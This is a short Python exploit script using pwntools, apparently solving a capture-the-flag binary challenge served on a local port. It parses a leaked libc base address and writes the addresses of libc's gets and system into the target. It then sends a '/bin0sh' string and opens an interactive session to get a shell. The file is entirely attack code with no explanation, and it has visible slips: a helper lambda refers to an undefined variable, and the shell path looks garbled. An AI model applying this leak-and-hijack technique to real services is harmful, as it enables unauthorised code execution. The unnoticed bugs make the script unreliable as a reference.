from pwn import *
context(os='linux', arch='amd64', log_level='debug')

procname = './pwn'
libcname = './libc.so.6'

# io = process(procname, stdin=PTY)
io = remote('127.0.0.1', 40865)
elf = ELF(procname)
libc = ELF(libcname)

n2b = lambda x    : str(x).encode()
rv  = lambda x    : io.recv(x)
ru  = lambda s    : io.recvuntil(s, drop=True)
sd  = lambda s    : io.send(s)
sl  = lambda s    : io.sendline(s)
sn  = lambda s    : sl(n2b(n))
sa  = lambda p, s : io.sendafter(p, s)
sla = lambda p, s : io.sendlineafter(p, s)
sna = lambda p, n : sla(p, n2b(n))
ia  = lambda      : io.interactive()
rop = lambda r    : flat([p64(x) for x in r])

pause()

ru(b'gift: ')
libc.address = int(rv(14), 16)
success(f'leak libc.address: {hex(libc.address)}')


sd(p64(libc.sym.gets))
sd(p64(libc.sym.gets))
sd(p64(libc.sym.system))

ru(b'good job!')

sl(p64(0))
sl(b'/bin0sh')

ia()
